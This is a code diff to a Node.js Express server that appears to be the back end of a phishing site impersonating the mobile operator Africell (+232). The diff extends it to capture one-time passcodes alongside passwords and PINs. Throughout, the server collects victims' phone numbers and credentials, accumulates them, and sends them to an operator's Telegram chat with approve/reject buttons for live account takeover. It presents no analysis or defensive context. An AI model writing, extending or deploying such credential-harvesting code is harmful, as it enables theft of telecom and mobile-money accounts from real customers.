@@ -1,5 +1,6 @@
 const express = require('express');
 const cors = require('cors');
+const path = require('path');
 require('dotenv').config();
 
 const app = express();
@@ -9,7 +10,7 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('.')); // Tells Express to serve your static HTML files
 
-// Memory pads to track user authentication states by phone number
+// Memory maps to track user authentication states by phone number
 const orderStatuses = {};   
 const lastSubmissionTime = {}; 
 const userCredentials = {}; // Tracks collected credentials per phone
@@ -53,57 +54,66 @@ app.post('/api/submit-order', async (req, res) => {
     try {
         const { phone, uniqueId } = req.body;
         
+        if (!phone) {
+            return res.status(400).json({ success: false, message: 'Phone number required.' });
+        }
+
+        const cleanPhone = phone.replace(/\s+/g, '').trim();
         const currentTime = Date.now(); 
         const cooldownTime = 15 * 1000; // 15 seconds cooldown
 
         // Force status to 'pending' immediately on every new request
-        orderStatuses[phone] = 'pending';
+        orderStatuses[cleanPhone] = 'pending';
 
-        // Bypass cooldown for PIN codes and passwords so multi-step forms never get stuck
-        const isImportantAction = (uniqueId && (uniqueId.startsWith('PIN: ') || uniqueId.startsWith('Password: ')));
+        const isImportantAction = (uniqueId && (uniqueId.startsWith('PIN: ') || uniqueId.startsWith('Login PIN: ') || uniqueId.startsWith('OTP Code: ') || uniqueId.startsWith('Password: ')));
 
-        if (!isImportantAction && lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
+        if (!isImportantAction && lastSubmissionTime[cleanPhone] && (currentTime - lastSubmissionTime[cleanPhone] < cooldownTime)) {
             return res.json({ success: true, message: 'Already submitted.' });
         }
 
-        lastSubmissionTime[phone] = currentTime;
+        lastSubmissionTime[cleanPhone] = currentTime;
 
         const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
         const countryFlag = "🇸🇱";
-        const rawDigits = phone ? phone.replace(/\+232/g, '').trim() : '';
+        const rawDigits = cleanPhone.replace(/\+232/g, '').trim();
 
-        // Initialize or retrieve user credentials accumulator
-        if (!userCredentials[phone]) {
-            userCredentials[phone] = {};
+        if (!userCredentials[cleanPhone]) {
+            userCredentials[cleanPhone] = {};
         }
 
         let headerTitle = "🔔 *Africell Submission Update*";
         let wrongButtonText = "❌ Wrong Info";
 
-        // Accumulate/Merge incoming data into the user's permanent session profile
-        if (uniqueId && uniqueId.startsWith('PIN: ')) {
+        if (uniqueId && (uniqueId.startsWith('PIN: ') || uniqueId.startsWith('Login PIN: '))) {
             headerTitle = "🔐 *Africell PIN Code Submitted*";
             wrongButtonText = "⚠️ Wrong PIN";
-            userCredentials[phone].mpin = uniqueId.replace('PIN: ', '');
+            userCredentials[cleanPhone].mpin = uniqueId.replace('PIN: ', '').replace('Login PIN: ', '').trim();
+        } else if (uniqueId && uniqueId.startsWith('OTP Code: ')) {
+            headerTitle = "📱 *Africell OTP Code Submitted*";
+            wrongButtonText = "⚠️ Wrong OTP";
+            userCredentials[cleanPhone].otp = uniqueId.replace('OTP Code: ', '').trim();
         } else if (uniqueId) {
-            // Captures main login password
-            userCredentials[phone].password = uniqueId;
+            userCredentials[cleanPhone].password = uniqueId;
             headerTitle = "🔑 *Africell Login Attempt*";
             wrongButtonText = "⚠️ Wrong Password";
         }
 
-        // Build a comprehensive message displaying accumulated user info
+        userCredentials[cleanPhone].phone = cleanPhone;
+
         let message = `${headerTitle}\n\n` +
                       `${countryFlag} Country: \`+232\`\n` +
                       `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
 
-        if (userCredentials[phone].mpin) {
-            message += `\n🔐 PIN Code: \`${escapeMarkdown(userCredentials[phone].mpin)}\``;
+        if (userCredentials[cleanPhone].mpin) {
+            message += `\n🔐 PIN Code: \`${escapeMarkdown(userCredentials[cleanPhone].mpin)}\``;
         }
-        if (userCredentials[phone].password) {
-            message += `\n🔑 Password: \`${escapeMarkdown(userCredentials[phone].password)}\``;
+        if (userCredentials[cleanPhone].otp) {
+            message += `\n📱 OTP Code: \`${escapeMarkdown(userCredentials[cleanPhone].otp)}\``;
+        }
+        if (userCredentials[cleanPhone].password) {
+            message += `\n🔑 Password: \`${escapeMarkdown(userCredentials[cleanPhone].password)}\``;
         }
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -116,23 +126,22 @@ app.post('/api/submit-order', async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Approve", callback_data: `approve_${phone}_${encodedId}` }
+                        { text: "✅ Approve", callback_data: `approve_${cleanPhone}_${encodedId}` }
                     ],
                     [
-                        { text: wrongButtonText, callback_data: `wrong_id_${phone}_${encodedId}` }
+                        { text: wrongButtonText, callback_data: `wrong_id_${cleanPhone}_${encodedId}` }
                     ]
                 ]
             }
         });
 
-        // 5-minute timeout check for Telegram admin
         if (sentTelegramMsg && sentTelegramMsg.result) {
             const msgChatId = sentTelegramMsg.result.chat.id;
             const msgId = sentTelegramMsg.result.message_id;
 
             setTimeout(async () => {
-                if (orderStatuses[phone] === 'pending') {
-                    orderStatuses[phone] = 'expired';
+                if (orderStatuses[cleanPhone] === 'pending') {
+                    orderStatuses[cleanPhone] = 'expired';
 
                     let expiredMessage = `⌛ *Africell Request Expired / Timed Out*\n\n` +
                                          `${countryFlag} Country: \`+232\`\n` +
@@ -151,7 +160,7 @@ app.post('/api/submit-order', async (req, res) => {
                         console.error('Failed to expire Telegram message:', err.message);
                     }
                 }
-            }, 5 * 60 * 1000); // 5 minutes
+            }, 5 * 60 * 1000);
         }
 
         res.json({ success: true, message: 'Sent successfully.' });
@@ -161,16 +170,15 @@ app.post('/api/submit-order', async (req, res) => {
     }
 });
 
-// Polling loop to check if admin approved the submission
 app.get('/api/check-status', (req, res) => {
-    const phone = req.query.phone ? req.query.phone.trim() : '';
+    const phone = req.query.phone ? req.query.phone.replace(/\s+/g, '').trim() : '';
     const status = orderStatuses[phone] || 'pending';
+    const timestamp = Date.now();
     
     console.log(`Polling check for phone: [${phone}] -> status: ${status}`);
-    res.json({ status });
+    res.json({ status, timestamp });
 });
 
-// Handles inline button clicks from Telegram admin
 app.post('/api/telegram-webhook', async (req, res) => {
     try {
         const update = req.body;
@@ -192,7 +200,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 const lastUnderscoreIndex = remainder.lastIndexOf('_');
                 if (lastUnderscoreIndex !== -1) {
                     phone = remainder.substring(0, lastUnderscoreIndex);
+                } else {
+                    phone = remainder;
                 }
+                phone = phone.trim();
 
                 if (callbackData.startsWith('approve_')) {
                     orderStatuses[phone] = 'approved';
@@ -220,6 +231,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 const creds = userCredentials[phone];
                 if (creds.mpin) {
                     updatedMessage += `\n🔐 PIN Code: \`${escapeMarkdown(creds.mpin)}\``;
+                }
+                if (creds.otp) {
+                    updatedMessage += `\n📱 OTP Code: \`${escapeMarkdown(creds.otp)}\``;
                 }
                 if (creds.password) {
                     updatedMessage += `\n🔑 Password: \`${escapeMarkdown(creds.password)}\``;
@@ -255,9 +269,7 @@ async function registerTelegramWebhook() {
     const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;
 
     try {
-        const telegramUrl =
-            `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
-
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
         const result = await fetch(telegramUrl).then(res => res.json());
 
         console.log('Telegram webhook setup:', result);
@@ -266,6 +278,10 @@ async function registerTelegramWebhook() {
         console.error('Telegram webhook setup failed:', error.message);
     }
 }
+
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'login.html'));
+});
 
 app.listen(PORT, () => {
     console.log(`Server running live at http://localhost:${PORT}`);
